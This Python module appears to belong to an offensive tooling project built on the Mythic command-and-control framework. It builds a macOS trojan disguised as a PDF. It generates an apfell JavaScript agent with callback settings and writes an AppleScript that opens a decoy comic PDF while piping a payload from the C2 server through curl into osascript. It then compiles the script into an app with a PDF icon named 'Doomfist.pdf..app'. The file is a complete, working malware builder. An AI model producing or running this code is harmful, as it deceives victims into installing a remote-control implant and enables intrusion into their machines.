#https://null-byte.wonderhowto.com/how-to/hacking-macos-create-fake-pdf-trojan-with-applescript-part-2-disguising-script-0184706/
import shutil, errno, os
from mythic import *
from sys import exit
from os import system
from Settings.MythicSettings import *


def pdf():
    temp = "./Templates/PDF/"
    payload = "./Payloads/PDF_Payload" 
    print("!!! This module currently downloads a pdf to modify as a default example") 
    realpdf = "https://assets.blz-contentstack.com/v3/assets/blt2477dcaf4ebd440c/blt193f89e1010ef25b/5d02e207a812cef40914a4dc/comic-overwatch-masquerade_en-us.pdf" #Can be replaced with any pdf

    def copyanything(src, dst):
        try:
            shutil.copytree(src, dst)
            print("[+] Copied Template Folder to '% s'" % payload)
        except OSError as error:
        	shutil.rmtree(dst)
        	shutil.copytree(src, dst)
        	print("[+] Overwrote files '%s'" % payload)
    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        mythic = mythic_rest.Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        # define what our payload should be
        p = mythic_rest.Payload(
            # what payload type is it
            payload_type="apfell", 
            # define non-default c2 profile variables
            c2_profiles={
                "http":[
                        {"name": "callback_host", "value": mythic_http_callback_host},
                        {"name": "callback_interval", "value": mythic_http_callback_interval}
                    ]
                },
            # give our payload a description if we want
            tag="PDF Trojan",
            selected_os="macOS",
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            filename="PDF_Payload.js")
        print("[+] Creating new apfell payload")
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)

        print("[*] Building PDF Payload")
        payloadDownloadid = resp.response.file_id.agent_file_id

        url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid # modify to point to desired location

        os.system("curl https://assets.blz-contentstack.com/v3/assets/blt2477dcaf4ebd440c/blt193f89e1010ef25b/5d02e207a812cef40914a4dc/comic-overwatch-masquerade_en-us.pdf -o " + payload + "/doomfist.pdf")  

        fin = open("./Payloads/PDF_Payload/script.txt", "w")
        data = 'do shell script "curl -s ' + realpdf + ' | open -f -a Preview.app & curl -k ' + url + ' | osascript -l JavaScript &"'
        fin.write(data)
        fin.close()

        os.system("/usr/bin/osacompile -o Payloads/PDF_Payload/test.app Payloads/PDF_Payload/script.txt")
        os.system("bash Payloads/PDF_Payload/convert.sh Payloads/PDF_Payload/doomfist.pdf applet")

        shutil.copyfile(payload + "/applet.icns" , payload + "/test.app/Contents/Resources/applet.icns")
        shutil.copyfile(payload + "/Info.plist" , payload + "/test.app/Contents/Info.plist")

        os.system("cp -r Payloads/PDF_Payload/test.app Payloads/PDF_Payload/Doomfist.pdf..app")

                
        print("[+] Built PDF as Doomfist.pdf.")
        print("Notes: \n"
              "1) The created pdf file downloads the legit pdf to open and present to the user  \n"
              "2) After which the hosted payload is downloaded and executed")

    async def main():
        await scripting()
        try:
            while True:
                pending = mythic_rest.asyncio.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await mythic_rest.asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = mythic_rest.asyncio.all_tasks()
            for t in pending:
                t.cancel()    

    loop = mythic_rest.asyncio.get_event_loop()
    loop.run_until_complete(main())
